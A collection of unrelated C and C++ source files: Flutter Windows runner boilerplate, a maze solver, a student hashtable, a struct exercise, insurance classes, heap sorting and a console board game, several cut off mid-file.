    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <stdio.h>\n#define MAX_STACK_SIZE 100\n#define MAX_ROWS 6\n#define MAX_COLS 8\ntypedef struct\n{\n    int x;\n    int y;\n} Position;\n\nint maze[MAX_ROWS][MAX_COLS] = {\n    {0, 1, 1, 1, 0, 1, 1, 1},\n    {1, 0, 1, 0, 1, 0, 1, 0},\n    {0, 1, 0, 0, 1, 1, 1, 1},\n    {0, 1, 1, 1, 0, 0, 1, 1},\n    {1, 0, 0, 1, 1, 0, 0, 0},\n    {0, 1, 1, 0, 0, 1, 1, 0}};\n\nstruct Move\n{\n    int i;\n    int j;\n};\n\nstruct Move move[8] = {\n    {0, 1}, {1, 1}, {1, 0}, {1, -1}, {0, -1}, {-1, -1}, {-1, 0}, {-1, 1}};\n\ntypedef struct\n{\n    Position data[MAX_STACK_SIZE];\n    int top;\n} MazeStack;\n\nvoid initStack(MazeStack *stack)\n{\n    stack->top = -1;\n}\n\nint isEmpty(MazeStack *stack)\n{\n    return stack->top == -1;\n}\n\nvoid push(MazeStack *stack, Position pos)\n{\n    if (stack->top < MAX_STACK_SIZE - 1)\n    {\n        stack->data[++stack->top] = pos;\n    }\n}\n\nPosition pop(MazeStack *stack)\n{\n    Position pos = {-1, -1}; // Invalid position\n    if (!isEmpty(stack))\n    {\n        pos = stack->data[stack->top--];\n    }\n    return pos;\n}\n\nint findPath(int maze[MAX_ROWS][MAX_COLS], MazeStack *stack)\n{\n    int startRow = 0, startCol = 0;\n    int endRow = MAX_ROWS - 1, endCol = MAX_COLS - 1;\n\n    Position startPos = {startRow, startCol};\n    Position endPos = {endRow, endCol};\n\n    push(stack, startPos); // \u5c06\u5165\u53e3\u4f4d\u7f6e\u5165\u6808\n\n    while (!isEmpty(stack))\n    {\n        Position currentPos = stack->data[stack->top];\n\n        // \u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u662f\u51fa\u53e3\uff0c\u6253\u5370\u8def\u5f84\u5e76\u8fd4\u56de\n        if (currentPos.x == endPos.x && currentPos.y == endPos.y)\n        {\n            printf(\"Found path!\\n\");\n\n            // \u6253\u5370\u8def\u5f84\n            for (int i = 0; i <= stack->top; ++i)\n            {\n                printf(\"(%d, %d) \", stack->data[i].x, stack->data[i].y);\n            }\n\n            return 1; // \u627e\u5230\u8def\u5f84\n        }\n\n        int found = 0; // \u6807\u8bb0\u662f\u5426\u627e\u5230\u53ef\u4ee5\u8d70\u7684\u65b9\u5411\n\n        // \u5c1d\u8bd5\u5411\u516b\u4e2a\u65b9\u5411\u79fb\u52a8\n        for (int k = 0; k < 8; ++k)\n        {\n            int nextRow = currentPos.x + move[k].i;\n            int nextCol = currentPos.y + move[k].j;\n\n            // \u68c0\u67e5\u662f\u5426\u8d8a\u754c\u548c\u662f\u5426\u53ef\u4ee5\u8d70\n            if (nextRow >= 0 && nextRow < MAX_ROWS &&\n                nextCol >= 0 && nextCol < MAX_COLS &&\n                maze[nextRow][nextCol] == 0)\n            {\n                Position nextPos = {nextRow, nextCol};\n                push(stack, nextPos);       // \u5c06\u65b0\u4f4d\u7f6e\u5165\u6808\n                maze[nextRow][nextCol] = 2; // \u6807\u8bb0\u5df2\u8d70\u8fc7\u7684\u4f4d\u7f6e\n                found = 1;                  // \u627e\u5230\u4e86\u53ef\u4ee5\u8d70\u7684\u65b9\u5411\n                break;                      // \u53ea\u9700\u627e\u5230\u4e00\u4e2a\u65b9\u5411\u5373\u53ef\n            }\n        }\n\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230\u53ef\u4ee5\u8d70\u7684\u65b9\u5411\uff0c\u9000\u6808\n        if (!found)\n        {\n            pop(stack);\n        }\n    }\n\n    printf(\"No path found.\\n\");\n    return 0; // \u6ca1\u6709\u627e\u5230\u8def\u5f84\n}\n\nint main()\n{\n    MazeStack stack;\n    initStack(&stack);\n\n    if (!findPath(maze, &stack))\n    {\n        printf(\"No path found.\\n\");\n    }\n\n    return 0;\n}\n",
    "//hashtable firaol Berehanu \n//inputs a list of number using a key\n//using changing to stor multiple values at one idnex\n//also has rehash if the function becomes to crowed by having a index\n//source - youtbe and stakoverfolow\n\n\n#include <iostream>\n#include <cstring>\n#include <vector>\n#include <iomanip> \n#include <fstream>\n\nusing namespace std;\n// Struct definition\nstruct Student {\n    char givenName[100];\n    char surname[100];\n    float grade;\n    int studentID;\n    Student* next = NULL;\n};\n\n// Function declarations\nStudent** addPupils(Student** roster, int &currentID, int &capacity);\nStudent** manAdd(Student** roster, int &currentID, int &capacity);\nvoid displayAll(Student** roster, int capacity);\nvoid display(Student** roster, int capacity);\nvoid eliminate(Student** roster, int capacity);\nvoid resetRoster(Student* roster[], int capacity);\nvoid printChain(Student* current);\nStudent** rehashRoster(Student** roster, Student** newRoster, int &capacity, int currentID);\n\n// Main function\nint main() {\n    srand(time(0));\n    bool exitProgram = false;\n    Student** roster = new Student*[100];\n    char userInput[7];\n    int currentID = 0;\n    int capacity = 100;\n    resetRoster(roster, capacity);\n    while (!exitProgram) {\n        cout << \"Please enter a valid command (ADD, MADD, PRINT, ALL(PRINT ALL), DELETE, QUIT):\" << endl;\n        cin >> userInput;\n        if (strcmp(userInput, \"MADD\") == 0) {\n            roster = manAdd(roster, currentID, capacity);\n        }\n        if (strcmp(userInput, \"ADD\") == 0) {\n            roster = addPupils(roster, currentID, capacity);\n        }\n        else if (strcmp(userInput, \"ALL\") == 0) {\n            displayAll(roster, capacity);\n        }\n        else if (strcmp(userInput, \"PRINT\") == 0) {\n            display(roster, capacity);\n        }\n        else if (strcmp(userInput, \"DELETE\") == 0) {\n            eliminate(roster, capacity);\n        }\n        else if (strcmp(userInput, \"QUIT\") == 0) {\n            exitProgram = true;\n        }\n    }\n    return 0;\n}\n\n// Function to add pupils\nStudent** addPupils(Student** roster, int &currentID, int &capacity) {\n    int students;\n    cout << \"How many students would you like to add?\" << endl;\n    cin >> students;\n    for (int i = 0; i < students; i++) {\n        char input[100];\n        char givenName[100];\n        char surname[100];\n        fstream givenFile(\"givenName.txt\");\n        fstream surnameFile(\"surname.txt\");\n        int count;\n        int num = (rand() % 20) + 1;\n        int num2 = (rand() % 20) + 1;\n        Student* newStudent = new Student();\n        count = 1;\n        while (givenFile.getline(input, 100, '\\n')) {\n            if (count == num) {\n                strcpy(givenName, input);\n                count++;\n            }\n            count++;\n        }\n        givenFile.close();\n        count = 1;\n        while (surnameFile.getline(input, 100, '\\n')) {\n            if (count == num2) {\n                strcpy(surname, input);\n                count++;\n            }\n            count++;\n        }\n        surnameFile.close();\n        float r = static_cast <float> (rand()) / static_cast <float> (RAND_MAX);\n        r *= 23;\n        while (r > 4) {\n            r -= 4;\n            while (r < 2) {\n                r += 1;\n            }\n        }\n        strcpy(newStudent->givenName, givenName);\n        strcpy(newStudent->surname, surname);\n        newStudent->studentID = currentID;\n        newStudent->grade = r;\n        if (roster[(currentID) % capacity] == NULL) {\n            roster[(currentID % capacity)] = newStudent;\n        }\n        else {\n            if (roster[(currentID) % capacity]->next == NULL) {\n                roster[currentID % capacity]->next = newStudent;\n            }\n            else {\n                if (roster[(currentID) % capacity]->next->next == NULL) {\n                    roster[currentID % capacity]->next->next = newStudent;\n                }\n                else {\n                    Student** newRoster = new Student*[capacity * 2];\n                    resetRoster(newRoster, capacity * 2);\n                    roster = rehashRoster(roster, newRoster, capacity, currentID);\n                    roster[currentID % capacity]->next = newStudent;\n                }\n            }\n        }\n        currentID++;\n    }\n    return roster;\n}\n\n// Function to manually add a student\nStudent** manAdd(Student** roster, int &currentID, int &capacity) {\n    char input[100];\n    char givenName[100];\n    char surname[100];\n    float grade;\n    Student* newStudent = new Student();\n    cout << \"Enter the first name:\" << endl;\n    cin >> givenName;\n    cin.clear();\n    cout << \"Enter the last name:\" << endl;\n    cin >> surname;\n    cin.clear();\n    cout << \"Enter the grade:\" << endl;\n    cin >> grade;\n    cin.clear();\n    strcpy(newStudent->givenName, givenName);\n    strcpy(newStudent->surname, surname);\n    newStudent->studentID = currentID;\n    newStudent->grade = grade;\n    if (roster[(currentID) % capacity] == NULL) {\n        r",
    "#include <iostream>\n#include <string>\nusing namespace  std;\n\nstruct DetailAlamat {\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa {\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur;\n};\n\nint main()\n{\n    Mahasiswa mhs[3];\n    for(int i = 0; i < 3; i++) {\n        cout << \"Data ke-\" << (i + 1) << \":\" << endl;\n        cout << \"Nomor Mahasiswa : \";\n        getline(cin, mhs[i].nim);\n        cout << \"Nama Mahasiswa : \";\n        getline(cin, mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa : \" << endl;\n        cout << \"\\t Nama Desa : \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\t Nama Kota : \";\n        cin >> mhs[i].alamat.kota;\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore(1,'\\n');\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++) {\n        cout << endl;\n        cout << \"Data Mahasiswa ke-\" << (i + 1) << \":\" << endl;\n        cout << \"\\n NIM : \" << mhs[i].nim;\n        cout << \"\\n Nama : \" << mhs[i].nama;\n        cout << \"\\n Alamat : \";\n        cout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n        cout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n        cout << \"\\n Umur : \" << mhs[i].umur;\n    }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"untitled\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <cstdlib>\n#include <vector>\n#include <fstream>\n#include <string>\n\nusing namespace std;\nclass Database;\nclass PassportData {\nprivate:\n    int id;\n    string name;\n    string surname;\n    string number;\npublic:\n    PassportData(string name, int id, string surname,\n        string number) : name(name), id(id), surname(surname), number(number) {}\n    virtual ~PassportData() {}\n\n    int getId() const { return id; }\n    string getName() const { return name; }\n    string getSurname() const { return surname; }\n    string getNumber() const { return number; }\n};\nclass Employee {\npublic:\n    Employee(string name, int id, double salary,\n        Database* db) : name(name), id(id), salary(salary), db(db) {}\n    virtual ~Employee() {}\n    virtual void work() = 0;\n    virtual void print_info() const {\n        cout << \"Name: \" << name << \", ID: \" << id << \", Salary: \" << salary << endl;\n    }\n    string getname() { return name; }\n    int getid() { return id; }\n    double getsalary() { return salary; }\n    void setPassportData(PassportData* newpassport) {\n        passport = newpassport;\n    }\nprotected:\n    string name;\n    int id;\n    double salary;\n    Database* db;\n    PassportData* passport;\n};\nclass Policy;\nclass Agent : public Employee {\npublic:\n    Agent(string name, int id, double salary, Database* db) : Employee(name, id, salary,db) {}\n    void work() override {\n        cout << \"Agent is working with clients.\" << endl;\n    }\n    void print_info() const {\n        cout << \"\u0418\u043c\u044f \u0430\u0433\u0435\u043d\u0442\u0430: \" << name << \", ID \u0430\u0433\u0435\u043d\u0442\u0430: \" << id << \", \u0437\u0430\u0440\u043f\u043b\u0430\u0442\u0430: \" << salary << endl;\n    }\n    void setprice(int number);\n};\nclass Database; \nclass Manager : public Employee {\npublic:\n    Manager(string name, int id, double salary, Database* db) : Employee(name, id, salary,db) {}\n    void work() override {\n        cout << \"Manager is managing employees.\" << endl;\n    }\n    void addAgent(Agent* agent);\n    void removeAgent(int id);\n};\nclass Policy {\npublic:\n    Policy(int number, double price, double coverage)\n        : number(number), price(price), coverage(coverage) {}\n    virtual ~Policy() {}\n    virtual void print_info() const {\n        cout << \"Number: \" << number << \", Price: \" << price << \", Coverage: \" << coverage << endl;\n    }\n    void setprice(double newprice) {\n        price = newprice;\n    }\n    int getnumber() { return number; }\n    double getprice() { return price; }\n    double getcoverage() { return coverage; }\n    virtual string getPolicy() = 0;\nprivate:\n    int number;\n    double price;\n    double coverage;\n};\nclass Car {\nprivate:\n    double price;\n    string type;\npublic:\n    Car(double price, string type) : type(type), price(price) {}\n    string getType() {\n        return type;\n    }\n    double getPrice() const { return price; }\n\n};\nclass PassengerCar : public Car {\npublic:\n    PassengerCar(double price, string type, int seats) : Car(price, type), seats(seats) {}\n    int getSeats() const { return seats; }\n    double getPrice() const { return price * 0, 10 * seats; }\n\nprivate:\n    int seats; // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043c\u0435\u0441\u0442 \u0432 \u043b\u0435\u0433\u043a\u043e\u0432\u043e\u043c \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\n    double price;\n\n};\nclass TruckCar : public Car {\npublic:\n    TruckCar(double price, string type, double loadCapacity) : Car(price, type), loadCapacity(loadCapacity) {}\n    double getLoadCapacity() const { return loadCapacity; }\n    double getPrice() const { return price * 0,010* loadCapacity; }\n\nprivate:\n    double price;\n    double loadCapacity; // \u0413\u0440\u0443\u0437\u043e\u043f\u043e\u0434\u044a\u0435\u043c\u043d\u043e\u0441\u0442\u044c \u0433\u0440\u0443\u0437\u043e\u0432\u0438\u043a\u0430\n};\nclass CarPolicy : public Policy {\nprivate:\n    double price;\n    int number;\n    Car* car;\npublic:\n    CarPolicy(int number, double price, double coverage)\n        : Policy(number, price, coverage), price(600), number(1) {}\n    ~CarPolicy() {}\n    string getPolicy() override {\n        return \"Car_policy\";\n    }\n    void setprice(double newprice) {\n        price = newprice;\n    }\n    void setCar(Car* newCar) {\n        car = newCar;\n    }\n    Car* getCar() const {\n        return car;\n    }\n};\nclass Realty {\nprivate:\n    double price;\n    string type;\npublic:\n    string getType() {\n        return type;\n    }\n    Realty(double price, string type) : type(type), price(price) {}\n    double getPrice() const { return price; }\n};\nclass House : public Realty {\npublic:\n    House(double price, string type, int rooms) : Realty(price, type), rooms(rooms) {}\n    int getRooms() const { return rooms; }\n    double getPrice() const { return price * 0,5 *rooms; }\n\nprivate:\n    int rooms;\n    double price;\n};\nclass Flat : public Realty {\npublic:\n    Flat(double price, string type, int floor) : Realty(price, type), floor(floor) {}\n    int getFloor() const { return floor; }\n    double getPrice() const { return price*0,75* floor; }\nprivate:\n    int floor;\n    double price;\n\n};\nclass HomeInsurancePolicy : public Policy {\npublic:\n    HomeInsurancePolicy(int number, double price, double coverage)\n        : Policy(number, price, coverage), price(2000), number(2) {}\n    ~HomeInsurancePolicy() {}\n    string getPolicy() override {",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <fstream>\n#include <string>\n#include <sstream>\n#include <chrono>\nusing namespace std::chrono;\nusing namespace std;\n\nusing namespace std;\n\nstruct populations\n{\n    string city;\n    int population;\n};\n\nvector<populations> read_file(const string &filename) // reading csv files\n{\n    vector<populations> data;\n    ifstream file(filename);\n    string line, city;\n    int population;\n    while (getline(file, line))\n    {\n        stringstream ss(line);\n        getline(ss, city, ';');\n        ss >> population;\n        data.push_back({city, population});\n        // getting city and population\n    }\n    return data;\n}\n\nvoid write_file(const vector<populations> &P, const string &filename)\n{\n    ofstream file(filename);\n    for (const auto &data : P)\n    {\n        file << data.city << \";\" << data.population << \"\\n\";\n    }\n}\n\nvoid swap_elements(vector<populations> &P, int first, int second)\n{\n    populations temp = P[first];\n    P[first] = P[second];\n    P[second] = temp;\n}\n\nvoid max_heapify(vector<populations> &arr, int i, int size)\n{\n    // O(logn) time complexity\n    int left_node = 2 * i + 1;\n    int right_node = 2 * i + 2;\n    int largest = i;\n\n    if (left_node < size && arr[left_node].population > arr[largest].population)\n    {\n        largest = left_node;\n    }\n\n    if (right_node < size && arr[right_node].population > arr[largest].population)\n    {\n        largest = right_node;\n    }\n\n    if (largest != i)\n    {\n\n        swap_elements(arr, i, largest); // swapping arr[i] and arr[largest]\n\n        max_heapify(arr, largest, size); // recursively heapifying the sub-tree\n    }\n}\n\nvoid build_max_heap(vector<populations> &arr)\n{\n    // O(n) time complexity\n    int heap_size = arr.size();\n\n    // Starting from the last non-leaf node\n    for (int i = heap_size / 2 - 1; i >= 0; --i)\n    {\n        max_heapify(arr, i, heap_size);\n    }\n}\n\nvoid heapsort(vector<populations> &arr) // sorts in ascending order\n{                                       // Function to perform heapsort\n    int heap_size = arr.size();\n\n    build_max_heap(arr); // building a max-heap from the input array\n\n    /*Remove the largest element (located at the root) and ensure that the remaining elements in the\n     heap maintain the property of being a max-heap by adjusting their positions accordingly*/\n\n    for (int i = heap_size - 1; i > 0; --i)\n    {\n        swap_elements(arr, 0, i);\n        max_heapify(arr, 0, i);\n    }\n}\n\nvoid max_heap_insert(vector<populations> &array, populations value)\n{\n\n    array.push_back(value); // adding new element at the end of the array\n\n    int i = array.size() - 1; // index\n\n    while (i > 0 && array[(i - 1) / 2].population < array[i].population) // Move the new element up the tree in order to find the right place\n    {\n        swap_elements(array, i, (i - 1) / 2);\n        i = (i - 1) / 2;\n    }\n}\n\npopulations heap_extract_max(vector<populations> &array) // extract and return the maximum element of the max-heap degree==2\n{\n    if (array.empty())\n    {\n        cout << \"Heap is empty.\\n\";\n        populations p;\n        p.population = -1;\n        p.city = \"empty heap\";\n        return p; // p represents error\n    }\n\n    populations max_element = array[0]; // maximum element is the root on the max heap\n    array[0] = array.back();\n    array.pop_back();\n\n    //  the max-heap property\n    max_heapify(array, 0, array.size());\n\n    return max_element;\n}\n\nvoid heap_increase_key(vector<populations> &array, int index, int new_key) // increase the key of a specified element of the max-heap\n{\n    if (index < 0 || index >= array.size() || new_key <= array[index].population)\n    {\n        cout << \"Invalid index or new key is smaller than ex key.\\n\"; // when data doesn't come the right format\n        return;\n    }\n\n    array[index].population = new_key; // updating the key\n\n    // move the updated element up the tree to maintain the max-heap property\n    while (index > 0 && array[(index - 1) / 2].population < array[index].population)\n    {\n        swap_elements(array, index, (index - 1) / 2);\n        index = (index - 1) / 2;\n    }\n}\n\n// returns the maximum element of the max heap\npopulations heap_maximum(vector<populations> &array)\n{\n\n    if (array.empty())\n    {\n        cout << \"Heap is empty.\\n\";\n        populations p;\n        p.city = \"empty\";\n        p.population = 0;\n        return p; // p represents error\n    }\n\n    populations max_element = array[0];\n    return max_element;\n}\n\n// D-ARY HEAP\n\nvoid dary_max_heapify(vector<populations> &heap, int i, int d)\n{\n    int largest = i;\n    for (int j = 1; j <= d; ++j)\n    {\n        int child = d * i + j;\n        if (child < heap.size() && heap[child].population > heap[largest].population)\n        {\n            largest = child;\n        }\n    }\n\n    if (largest != i)\n    {\n        swap_elements(heap, i, largest);\n        dary_max_heapify(heap, largest, d);\n    }\n}\n\nvoid build_dary_heap(vector<populations> &heap, int degree)\n{\n    fo",
    "// Jakub Dutkiewicz EiT gr.2 188833\n// Visual Studio 2019\n\n#include <iostream>\n#include <string>\n#include <thread>\n#include <chrono>\n#include <ctime>\n\nusing namespace std;\n\nvoid Menu_gry();\n\nvoid Rysowanie(char T[9][9]) // funkcja rysujaca tablice\n{\n\n\n\n\tconst char kraw_poz = 0xCD;\n\tconst char kraw_pion = 0xBA;\n\tconst char lewa_gora_rog = 0xC9;\n\tconst char lewa_dol_rog = 0xC8;\n\tconst char prawa_gora_rog = 0xBB;\n\tconst char prawa_dol_rog = 0xBC;\n\tconst char litera_t = 0xCB;\n\tconst char odwroc_t = 0xCA;\n\tconst char lewe_t = 0xCC;\n\tconst char prawe_t = 0xB9;\n\tconst char krzyz = 0xCE;\n\tconst char spacja = 0xFF;\n\tchar znak1 = 111;\n\tchar znak2 = 120;\n\n\tcout << endl << endl << endl << endl;\n\n\tcout << endl << endl;\n\tcout << endl << \"                         \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog << \" \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[0][0] << spacja << kraw_pion << spacja << T[0][1] << spacja << kraw_pion << spacja << T[0][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[0][3] << spacja << kraw_pion << spacja << T[0][4] << spacja << kraw_pion << spacja << T[0][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[1][0] << spacja << kraw_pion << spacja << T[1][1] << spacja << kraw_pion << spacja << T[1][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[1][3] << spacja << kraw_pion << spacja << T[1][4] << spacja << kraw_pion << spacja << T[1][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[2][0] << spacja << kraw_pion << spacja << T[2][1] << spacja << kraw_pion << spacja << T[2][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[2][3] << spacja << kraw_pion << spacja << T[2][4] << spacja << kraw_pion << spacja << T[2][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewa_dol_rog << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << prawa_dol_rog << \" \" << lewa_dol_rog << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << prawa_dol_rog;\n\n\tcout << endl << \"                         \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog << \" \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[3][0] << spacja << kraw_pion << spacja << T[3][1] << spacja << kraw_pion << spacja << T[3][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[3][3] << spacja << kraw_pion << spacja << T[3][4] << spacja << kraw_pion << spacja << T[3][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << 